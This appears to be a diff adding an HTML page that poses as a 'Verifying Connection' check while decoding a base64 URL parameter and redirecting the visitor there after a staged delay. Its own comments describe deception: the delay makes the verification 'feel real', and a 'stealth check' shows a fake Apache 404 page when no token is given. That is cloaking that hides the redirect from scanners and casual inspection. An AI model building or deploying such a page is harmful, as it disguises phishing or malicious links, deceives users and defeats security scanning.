@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verifying Connection...</title>
+    <meta name="referrer" content="no-referrer">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+            display: flex; 
+            flex-direction: column;
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            background: #ffffff; 
+            margin: 0;
+            color: #333;
+        }
+        .loader { 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #3498db; 
+            border-radius: 50%; 
+            width: 24px; 
+            height: 24px; 
+            animation: spin 1s linear infinite; 
+            margin-bottom: 15px;
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .status-text { font-size: 14px; color: #666; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div id="main-content">
+        <div class="loader"></div>
+        <div class="status-text">Securing session...</div>
+    </div>
+
+    <script>
+        (function() {
+            const params = new URLSearchParams(window.location.search);
+            let token = params.get('t');
+            
+            // 1. STEALTH CHECK: If no token exists, mimic a server error
+            if (!token) {
+               document.title = "404 Not Found";
+    // Overriding the body style to look like a standard web server
+               document.body.style.display = "block";
+               document.body.style.padding = "20px";
+               document.body.style.textAlign = "left";
+               document.body.innerHTML = "<h1>404 Not Found</h1><p>The requested resource was not found on this server.</p><hr><i>Apache/2.4.41 (Ubuntu) Server at github.io Port 443</i>";
+            return;
+            }
+
+            // 2. TOKEN PROCESSING
+            try {
+                // Convert URL-safe characters back to standard Base64
+                token = token.replace(/-/g, '+').replace(/_/g, '/');
+                
+                // Fix potential padding issues
+                while (token.length % 4) {
+                    token += '=';
+                }
+                
+                // Decode
+                const target = atob(token);
+                
+                // 3. VALIDATE PROTOCOL
+                if (target.startsWith('http')) {
+                    // Slight delay to make the "Verification" feel real to the user
+                    setTimeout(() => {
+                        window.location.replace(target);
+                    }, 600);
+                } else {
+                    throw new Error("Invalid Protocol");
+                }
+            } catch (e) {
+                // If decoding fails, it was likely a bad/manual entry or a scanner
+                document.body.innerHTML = "<div class='status-text'>Verification link expired or invalid.</div>";
+            }
+        })();
+    </script>
+</body>
+</html>
